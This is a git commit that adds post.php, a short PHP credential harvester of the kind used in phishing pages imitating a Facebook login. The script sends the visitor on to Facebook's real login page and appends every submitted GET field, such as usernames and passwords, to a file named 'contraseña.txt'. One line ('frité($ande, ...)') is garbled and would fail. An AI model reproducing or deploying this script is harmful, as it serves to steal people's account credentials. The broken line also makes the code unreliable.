b66ca95bf87cf14ec7ffc73939320b63175ad5dd
ImTu18 <45504480+ImTu18@users.noreply.github.com>
2018-11-30 22:31:19 -0600

    Add files via upload

---
+++ post.php
@@ -0,0 +1,19 @@
+﻿<?php
+header("Location: http://www.facebook.com/login.php ");
+$handle = fopen("contraseña.txt", "a"); 
+
+foreach($_GET as $variable => $value) {
+	fwrite($handle, $variable);
+
+	fwrite($handle, "=");
+
+	fwrite($handle, $value);
+
+	fwrite($handle, "\r\n");
+}
+
+frité($ande, "\r\n");
+fclose($handle);
+
+exit
+?>
